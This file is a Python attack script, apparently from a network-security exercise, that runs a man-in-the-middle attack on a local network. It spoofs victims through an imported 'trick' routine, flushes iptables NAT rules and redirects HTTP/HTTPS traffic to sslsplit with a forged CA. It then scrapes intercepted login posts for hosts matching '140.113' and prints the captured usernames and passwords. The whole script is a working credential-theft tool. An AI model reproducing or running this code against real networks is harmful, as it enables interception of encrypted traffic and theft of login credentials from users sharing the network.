#!./.env/bin/python
import scapy.all as scapy
import threading
import time
import os
import shutil

from utils import get_victims, trick

LOG_DIR = 'log'


def sslsplit():
    os.system('iptables -t nat -F')
    os.system(
        'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
    os.system(
        'iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
    shutil.rmtree(LOG_DIR, ignore_errors=True)
    os.makedirs(LOG_DIR)
    os.system(
        f'sslsplit ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 -k ca.key -c ca.crt -l connection.log -S {LOG_DIR} > /dev/null 2>/dev/null')


def mitm():
    time.sleep(8)
    while True:
        time.sleep(1)
        for filename in os.scandir(LOG_DIR):
            if filename.is_file():
                if '140.113' in filename.path:
                    with open(filename.path, mode='r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            if line[:10] == 'logintoken':
                                line = line.split('&')
                                username = line[1].split('=')[1]
                                password = line[2].split('=')[1]
                                print(f'Username: {username}')
                                print(f'Password: {password}')
                    open(filename.path, mode='w').close()


def main():
    ips = get_victims()
    threads = list()
    threads.append(threading.Thread(target=trick, args=[ips]))
    threads.append(threading.Thread(target=sslsplit))
    threads.append(threading.Thread(target=mitm))
    for t in threads:
        t.start()


if __name__ == '__main__':
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    main()
